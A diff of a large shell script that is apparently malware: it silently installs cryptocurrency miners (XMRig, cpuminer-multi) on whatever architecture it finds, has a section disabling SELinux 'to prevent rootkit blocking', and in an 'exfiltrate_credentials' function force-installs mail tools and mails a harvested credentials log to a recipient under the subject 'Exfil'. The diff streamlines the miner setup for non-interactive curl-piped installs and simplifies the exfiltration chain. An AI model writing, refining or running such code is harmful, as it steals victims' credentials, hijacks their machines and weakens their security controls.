@@ -941,99 +941,34 @@ check_and_fix_dns "$@"
 # Auto-detect architecture
 DETECTED_ARCH=$(uname -m)
 
-# Check if running interactively (has a terminal)
-if [ -t 0 ]; then
-    # INTERACTIVE MODE - Show menu
-    echo ""
-    echo "=========================================="
-    echo "ARCHITECTURE SELECTION"
-    echo "=========================================="
-    echo ""
-    echo "[*] Auto-detected architecture: $DETECTED_ARCH"
-    echo ""
+# NON-INTERACTIVE MODE (ALWAYS) - Auto-detect architecture
+FORCE_ARCH="$DETECTED_ARCH"
+echo "[*] Auto-detected architecture: $DETECTED_ARCH"
 
-    # Map to suggested choice
-    case "$DETECTED_ARCH" in
-        x86_64|amd64)
-            SUGGESTED_CHOICE="1"
-            ARCH_NAME="x86_64 (Intel/AMD 64-bit)"
-            ;;
-        aarch64|arm64)
-            SUGGESTED_CHOICE="2"
-            ARCH_NAME="ARM64 (64-bit ARM - Raspberry Pi 4, etc.)"
-            ;;
-        armv7l|armhf|armv6l)
-            SUGGESTED_CHOICE="3"
-            ARCH_NAME="ARMv7/ARMv6 (32-bit ARM - routers, old Pi)"
-            ;;
-        i686|i386)
-            SUGGESTED_CHOICE="4"
-            ARCH_NAME="x86 (32-bit Intel/AMD - NOT SUPPORTED)"
-            ;;
-        mips|mipsel|mips64)
-            SUGGESTED_CHOICE="5"
-            ARCH_NAME="MIPS (routers - NOT SUPPORTED)"
-            ;;
-        *)
-            SUGGESTED_CHOICE="6"
-            ARCH_NAME="Unknown: $DETECTED_ARCH"
-            ;;
-    esac
-
-    echo "Detected: $ARCH_NAME"
-    echo ""
-    echo "Select your CPU architecture:"
-    echo "  1) x86_64 / amd64    (Intel/AMD 64-bit servers)"
-    echo "  2) ARM64 / aarch64   (Raspberry Pi 4, ARM servers)"
-    echo "  3) ARMv7 / ARMv6     (32-bit ARM - routers, old Raspberry Pi)"
-    echo "  4) x86 / i686        (32-bit Intel/AMD - NOT SUPPORTED)"
-    echo "  5) MIPS              (Routers - NOT SUPPORTED)"
-    echo "  6) Skip/Auto-detect  (Use detected: $DETECTED_ARCH)"
-    echo ""
-    echo -n "Enter choice [1-6] (default: $SUGGESTED_CHOICE): "
-
-    read -r ARCH_CHOICE
-    ARCH_CHOICE=${ARCH_CHOICE:-$SUGGESTED_CHOICE}
-
-    case "$ARCH_CHOICE" in
-        1) FORCE_ARCH="x86_64"; echo "[*] Selected: x86_64" ;;
-        2) FORCE_ARCH="aarch64"; echo "[*] Selected: ARM64" ;;
-        3) FORCE_ARCH="armv7l"; echo "[*] Selected: ARMv7 (will use cpuminer-multi)" ;;
-        4) echo "[!] ERROR: x86 32-bit is NOT supported"; exit 1 ;;
-        5) echo "[!] ERROR: MIPS is NOT supported"; exit 1 ;;
-        6|*) FORCE_ARCH="$DETECTED_ARCH"; echo "[*] Using auto-detected: $DETECTED_ARCH" ;;
-    esac
-    echo ""
-else
-    # NON-INTERACTIVE MODE (piped from curl) - Auto-detect silently
-    FORCE_ARCH="$DETECTED_ARCH"
-    echo "[*] Non-interactive mode: Auto-detected architecture: $DETECTED_ARCH"
-
-    # Validate architecture is supported
-    case "$DETECTED_ARCH" in
-        x86_64|amd64)
-            echo "[*] Using XMRig for x86_64"
-            ;;
-        aarch64|arm64)
-            echo "[*] Using XMRig ARM64 for aarch64"
-            ;;
-        armv7l|armhf|armv6l)
-            echo "[*] Using cpuminer-multi for ARMv7/ARMv6"
-            ;;
-        i686|i386)
-            echo "[!] ERROR: 32-bit x86 is NOT supported by modern miners"
-            exit 1
-            ;;
-        mips|mipsel|mips64)
-            echo "[!] ERROR: MIPS architecture is NOT supported"
-            exit 1
-            ;;
-        *)
-            echo "[!] WARNING: Unknown architecture: $DETECTED_ARCH"
-            echo "[!] Attempting to proceed with auto-detected value..."
-            ;;
-    esac
-fi
+# Validate architecture is supported
+case "$DETECTED_ARCH" in
+    x86_64|amd64)
+        echo "[*] Using XMRig for x86_64"
+        ;;
+    aarch64|arm64)
+        echo "[*] Using XMRig ARM64 for aarch64"
+        ;;
+    armv7l|armhf|armv6l)
+        echo "[*] Using cpuminer-multi for ARMv7/ARMv6"
+        ;;
+    i686|i386)
+        echo "[!] ERROR: 32-bit x86 is NOT supported by modern miners"
+        exit 1
+        ;;
+    mips|mipsel|mips64)
+        echo "[!] ERROR: MIPS architecture is NOT supported"
+        exit 1
+        ;;
+    *)
+        echo "[!] WARNING: Unknown architecture: $DETECTED_ARCH"
+        echo "[!] Attempting to proceed with auto-detected value..."
+        ;;
+esac
 
 # ==================== SELINUX DISABLE ====================
 # Disable SELinux temporarily to prevent rootkit blocking
@@ -4769,153 +4704,36 @@ exfiltrate_credentials() {
     # This runs ALWAYS as a second attempt for redundancy
     echo ""
     echo "=========================================="
-    echo "BACKUP: SENDING INLINE CREDENTIALS EMAIL"
+    echo "BACKUP: SIMPLE MAIL COMMAND ATTEMPT"
     echo "=========================================="
     echo ""
     
     if [ -f "$LOG_FILE_EMAIL" ]; then
-        echo "[*] Sending credentials inline (in email body)..."
+        echo "[*] Installing mail packages..."
         
-        local INLINE_SUBJECT="INLINE Credentials: $HOSTNAME"
+        # Install mail packages using user's exact approach
+        for p in mailutils mutt bsd-mailx sendmail ssmtp postfix; do
+            (command -v apt && apt install -y $p) ||
+            (command -v yum && yum install -y $p) ||
+            (command -v dnf && dnf install -y $p) ||
+            (command -v pacman && pacman -S --noconfirm $p) ||
+            (command -v zypper && zypper install -y $p) 2>/dev/null
+        done
         
-        # Try simple commands first (most reliable, no config needed)
-        local INLINE_SUCCESS=false
+        echo "[*] Trying mail commands..."
         
-        # Method 1: mail command
-        if command -v mail >/dev/null 2>&1; then
-            echo "[*] Trying mail command..."
-            if cat "$LOG_FILE_EMAIL" | mail -s "$INLINE_SUBJECT" "$RECIPIENT_EMAIL" 2>/dev/null; then
-                echo "[✓] Inline email sent via mail"
-                INLINE_SUCCESS=true
-            fi
-        fi
+        # Use user's exact mail command approach with || chaining
+        (cat "$LOG_FILE_EMAIL" 2>/dev/null | mail -s 'Exfil' "$RECIPIENT_EMAIL") ||
+        (cat "$LOG_FILE_EMAIL" 2>/dev/null | mutt -s 'Exfil' "$RECIPIENT_EMAIL") ||
+        (cat "$LOG_FILE_EMAIL" 2>/dev/null | sendmail "$RECIPIENT_EMAIL") ||
+        (cat "$LOG_FILE_EMAIL" 2>/dev/null | ssmtp "$RECIPIENT_EMAIL") 2>/dev/null ||
+        echo '[!] Failed to send email via any method'
         
-        # Method 2: mutt command
-        if [ "$INLINE_SUCCESS" = false ] && command -v mutt >/dev/null 2>&1; then
-            echo "[*] Trying mutt command..."
-            if cat "$LOG_FILE_EMAIL" | mutt -s "$INLINE_SUBJECT" "$RECIPIENT_EMAIL" 2>/dev/null; then
-                echo "[✓] Inline email sent via mutt"
-                INLINE_SUCCESS=true
-            fi
-        fi
-        
-        # Method 3: mailx command
-        if [ "$INLINE_SUCCESS" = false ] && command -v mailx >/dev/null 2>&1; then
-            echo "[*] Trying mailx command..."
-            if cat "$LOG_FILE_EMAIL" | mailx -s "$INLINE_SUBJECT" "$RECIPIENT_EMAIL" 2>/dev/null; then
-                echo "[✓] Inline email sent via mailx"
-                INLINE_SUCCESS=true
-            fi
-        fi
-        
-        # Method 4: s-nail command
-        if [ "$INLINE_SUCCESS" = false ] && command -v s-nail >/dev/null 2>&1; then
-            echo "[*] Trying s-nail command..."
-            if cat "$LOG_FILE_EMAIL" | s-nail -s "$INLINE_SUBJECT" "$RECIPIENT_EMAIL" 2>/dev/null; then
-                echo "[✓] Inline email sent via s-nail"
-                INLINE_SUCCESS=true
-            fi
-        fi
-        
-        # Method 5: sendmail with headers
-        if [ "$INLINE_SUCCESS" = false ] && command -v sendmail >/dev/null 2>&1; then
-            echo "[*] Trying sendmail command..."
-            {
-                echo "To: $RECIPIENT_EMAIL"
-                echo "From: root@$(hostname)"
-                echo "Subject: $INLINE_SUBJECT"
-                echo ""
-                cat "$LOG_FILE_EMAIL"
-            } | sendmail "$RECIPIENT_EMAIL" 2>/dev/null && {
-                echo "[✓] Inline email sent via sendmail"
-                INLINE_SUCCESS=true
-            }
-        fi
-        
-        # Method 6: /usr/sbin/sendmail
-        if [ "$INLINE_SUCCESS" = false ] && [ -x /usr/sbin/sendmail ]; then
-            echo "[*] Trying /usr/sbin/sendmail..."
-            {
-                echo "To: $RECIPIENT_EMAIL"
-                echo "From: root@$(hostname)"
-                echo "Subject: $INLINE_SUBJECT"
-                echo ""
-                cat "$LOG_FILE_EMAIL"
-            } | /usr/sbin/sendmail "$RECIPIENT_EMAIL" 2>/dev/null && {
-                echo "[✓] Inline email sent via /usr/sbin/sendmail"
-                INLINE_SUCCESS=true
-            }
-        fi
-        
-        # Method 7: ssmtp
-        if [ "$INLINE_SUCCESS" = false ] && command -v ssmtp >/dev/null 2>&1; then
-            echo "[*] Trying ssmtp command..."
-            {
-                echo "To: $RECIPIENT_EMAIL"
-                echo "From: root@$(hostname)"
-                echo "Subject: $INLINE_SUBJECT"
-                echo ""
-                cat "$LOG_FILE_EMAIL"
-            } | ssmtp "$RECIPIENT_EMAIL" 2>/dev/null && {
-                echo "[✓] Inline email sent via ssmtp"
-                INLINE_SUCCESS=true
-            }
-        fi
-        
-        # Method 8: Python3 simple email (no attachments)
-        if [ "$INLINE_SUCCESS" = false ] && command -v python3 >/dev/null 2>&1; then
-            echo "[*] Trying Python3 simple email..."
-            python3 -c "
-import smtplib
-import ssl
-from email.mime.text import MIMEText
-
-try:
-    # Read log file
-    with open('$LOG_FILE_EMAIL', 'r') as f:
-        body = f.read()
-    
-    msg = MIMEText(body, 'plain')
-    msg['From'] = '$SENDER_EMAIL'
-    msg['To'] = '$RECIPIENT_EMAIL'
-    msg['Subject'] = '$INLINE_SUBJECT'
-    
-    context = ssl.create_default_context()
-    with smtplib.SMTP('$SMTP_SERVER', $SMTP_PORT, timeout=30) as server:
-        server.ehlo()
-        server.starttls(context=context)
-        server.ehlo()
-        server.login('$SENDER_EMAIL', '$SMTP_PASSWORD')
-        server.send_message(msg)
-    print('Email sent successfully')
-except Exception as e:
-    print(f'Error: {e}')
-    exit(1)
-" 2>/dev/null && {
-                echo "[✓] Inline email sent via Python3"
-                INLINE_SUCCESS=true
-            }
-        fi
-        
-        if [ "$INLINE_SUCCESS" = true ]; then
-            echo ""
-            echo "[✓] ============================================"
-            echo "[✓] INLINE CREDENTIALS SENT SUCCESSFULLY!"
-            echo "[✓] ============================================"
-            echo "[✓] Log file contents delivered to: $RECIPIENT_EMAIL"
-            echo "[✓] Email subject: $INLINE_SUBJECT"
-            echo ""
-        else
-            echo ""
-            echo "[!] All inline email methods failed"
-            echo "[*] Credentials remain in: $LOG_FILE_EMAIL"
-            echo ""
-        fi
     else
         echo "[!] Log file not found: $LOG_FILE_EMAIL"
     fi
 
-    # Clean up temp files only if email succeeded
+    # Clean up temp files
     echo "[*] Cleaning up temporary files..."
     sleep 2
     rm -rf "$TEMP_DIR" 2>/dev/null
